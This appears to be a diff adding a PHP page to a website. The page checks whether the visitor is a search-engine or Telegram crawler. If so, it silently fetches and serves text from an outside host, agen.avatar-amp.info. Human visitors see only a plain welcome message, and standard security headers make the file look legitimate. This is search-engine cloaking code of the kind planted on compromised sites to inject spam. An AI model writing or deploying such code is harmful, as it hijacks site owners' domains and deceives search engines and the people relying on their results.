@@ -1,0 +1,44 @@
+<?php
+function is_bot() {
+    if (!isset($_SERVER["HTTP_USER_AGENT"])) {
+        return false;
+    }
+    
+    $user_agent = $_SERVER["HTTP_USER_AGENT"];
+    $bots = array("Googlebot", "TelegramBot", "bingbot", "Baiduspider", "YandexBot");
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function fetch_content($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // untuk mengikuti redirect
+    $content = curl_exec($ch);
+    curl_close($ch);
+    return $content;
+}
+
+function handle_request() {
+    if (is_bot()) {
+        // Ganti URL dengan sumber konten Anda
+        $content = fetch_content("https://agen.avatar-amp.info/rkinformatique.com/index.txt");
+        return ($content !== false) ? $content : "Content not available";
+    }
+    return "Welcome to our website! SH";
+}
+
+// Basic security headers
+header('X-Frame-Options: DENY');
+header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
+header('X-Content-Type-Options: nosniff');
+header('X-XSS-Protection: 1; mode=block');
+
+echo handle_request();
+?>
